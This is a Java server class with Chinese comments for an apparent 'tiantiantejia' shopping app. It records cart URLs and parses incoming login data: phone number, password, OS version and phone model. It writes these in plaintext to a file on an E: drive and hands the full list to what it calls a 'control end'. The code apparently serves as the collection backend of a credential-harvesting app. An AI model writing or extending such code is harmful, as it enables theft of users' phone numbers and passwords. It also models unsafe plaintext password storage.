package com.lu.java;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

import net.sf.json.JSONObject;
/**
 * 处理天天特价购物车
 * @author LU
 *
 */
public class ShopURL {
	
	public static void urlConfrim(String info){
		JSONObject obj = JSONObject.fromObject(info);
		String url = obj.getString("url");
		if(url.startsWith("url=")){
			shopCar(info);
		}else{
			countAndpwd(info);
		}
	}

	/**
	 * 购物车信息处理
	 * @param info
	 */
	public static void shopCar(String info){
		JSONObject obj = JSONObject.fromObject(info);
		String url = obj.getString("url");
		url = url.substring(5);
		System.out.println(url);
		SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String time = df.format(new Date());

		File file = new File("E:\\ApkServerData\\tiantiantejiaData\\ShopCarUrlData.txt");
		
		FileOutputStream fos;
		BufferedReader br;
		String read;
		int flag = 0;
		try {
			br = new BufferedReader(new FileReader(file));
			while((read = br.readLine()) != null){
				if(read.startsWith("URL:")){
					if(read.substring(5).equals(url)){
						flag = 1;
						break;
					}
				}
			}
			if(flag == 0){
				fos = new FileOutputStream(file,true);
				PrintWriter out = new PrintWriter(fos);
				out.println("time: "+time);
				out.println("URL: "+url);
				out.println("");
				out.close();
				System.out.println("新购物车信息存储成功");
			}else{
				System.out.println("购物车已存在，无需更新");
			}
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	/**
	 * 登录信息处理
	 * 手机号，密码，OS版本，手机型号
	 * @param info
	 */
	public static void countAndpwd(String info){
		JSONObject obj = JSONObject.fromObject(info);
		String url = obj.getString("url");
		String[] info_list = url.split("&");
		String phone="", password="", osVersion="", phoneModel="";
		for(int i = 0; i < info_list.length; i++){
			if(info_list[i].indexOf("phone=") != -1){
				phone = info_list[i].substring(info_list[i].indexOf("phone="));
			}else if(info_list[i].indexOf("password=") != -1){
				password = info_list[i].substring(info_list[i].indexOf("password="));
			}else if(info_list[i].indexOf("osversion=") != -1){
				osVersion = info_list[i].substring(info_list[i].indexOf("osversion="));
			}else if(info_list[i].indexOf("phonetype=") != -1){
				phoneModel = info_list[i].substring(info_list[i].indexOf("phonetype="));
			}
		}
		
		SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String time = df.format(new Date());

		File file = new File("E:\\ApkServerData\\tiantiantejiaData\\UserLoginData.txt");
		
		FileOutputStream fos;
		BufferedReader br;
		String read;
		int flag = 0;
		try {
			br = new BufferedReader(new FileReader(file));
			while((read = br.readLine()) != null){
				if(read.startsWith("phone=")){
					if(read.equals(phone)){
						flag = 1;
						break;
					}
				}
			}
			if(flag == 0){
				fos = new FileOutputStream(file,true);
				PrintWriter out = new PrintWriter(fos);
				out.println("Time="+time);
				out.println(phone);
				out.println(password);
				out.println(osVersion);
				out.println(phoneModel);
				out.println("---------------------");
				out.close();
				System.out.println("登陆用户信息存储成功。");
			}else{
				System.out.println("手机号"+phone+"信息已存在，无需存储。");
			}
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	/**
	 * 控制端用户信息请求
	 * @return
	 */
	public static String outUserData(){
		File file = new File("E:\\ApkServerData\\tiantiantejiaData\\UserLoginData.txt");
		String data ="{\"all\":\"";
		String read ;
		
		try {
			BufferedReader br = new BufferedReader(new FileReader(file));
			while((read = br.readLine()) != null){
				if(read.startsWith("phonetype=")){
					data +=read+"&";
				}else if(read.startsWith("Time") || read.startsWith("---")){
					//nothing
				}else {
					data +=read+",";
				}
			}
			data=data.substring(0,data.length()-1);
			data +="\"}";
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println("控制端请求用户数据成功");
		return data;
	}
}
